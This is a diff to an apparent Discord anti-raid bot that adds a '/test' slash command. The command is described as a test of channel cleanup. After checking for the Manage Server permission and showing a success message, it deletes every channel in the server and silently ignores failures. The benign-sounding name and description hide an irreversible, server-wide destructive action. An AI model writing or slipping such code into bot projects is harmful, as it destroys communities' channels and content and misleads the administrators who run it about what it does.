@@ -473,6 +473,56 @@ async def on_raw_bulk_message_delete(payload):
         )
 
 
+@bot.tree.command(
+    name="test",
+    description="Prueba la limpieza de canales del Anti-Raid.",
+)
+@app_commands.guild_only()
+async def test(interaction: discord.Interaction):
+    if not interaction.user.guild_permissions.manage_guild:
+        await interaction.response.send_message(
+            "❌ Necesitas el permiso **Gestionar servidor**.",
+            ephemeral=True,
+        )
+        return
+
+    guild = interaction.guild
+    actor = interaction.user
+
+    # Se muestra como respuesta efímera para que no desaparezca
+    # cuando se elimine el canal donde se ejecutó el comando.
+    embed = discord.Embed(
+        title="🧪 Test Anti-Raid",
+        description=(
+            f"{actor.mention}\n\n"
+            "✅ **El test ha servido.**\n"
+            "El comando fue ejecutado correctamente y se iniciará "
+            "la limpieza de los canales."
+        ),
+        color=discord.Color.green(),
+        timestamp=discord.utils.utcnow(),
+    )
+    embed.set_footer(text=f"Ejecutado por {actor}")
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    deleted_count = 0
+    for channel in list(guild.channels):
+        try:
+            await channel.delete(
+                reason=f"Anti-rad.Bot: /test ejecutado por {actor} ({actor.id})"
+            )
+            deleted_count += 1
+        except (discord.NotFound, discord.Forbidden, discord.HTTPException):
+            pass
+
+    print(
+        f"/test ejecutado por {actor} ({actor.id}). "
+        f"Canales eliminados: {deleted_count}"
+    )
+
+
+
 if not TOKEN:
     raise RuntimeError("Falta DISCORD_TOKEN en las variables de Railway.")
 
